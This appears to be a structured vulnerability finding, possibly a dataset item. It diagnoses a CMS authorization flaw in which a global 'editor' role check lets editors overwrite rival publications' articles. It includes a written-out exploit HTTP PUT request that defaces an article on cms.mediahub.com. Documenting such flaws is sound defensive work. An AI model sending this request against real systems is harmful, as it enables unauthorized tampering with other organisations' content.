diagnosis: The requireEditor middleware verifies that the user holds a generic 'editor' role globally, but fails to check whether the editor is assigned to or owns the specific publication/team managing res.locals.article. An editor from one publisher can overwrite articles of rival publications.
exploit_request:
PUT /api/cms/articles/10928 HTTP/1.1
Host: cms.mediahub.com
Authorization: Bearer <editor_jwt_brand_a>
Content-Type: application/json

{"title": "Overwritten Headline", "content": "Defaced article body"}
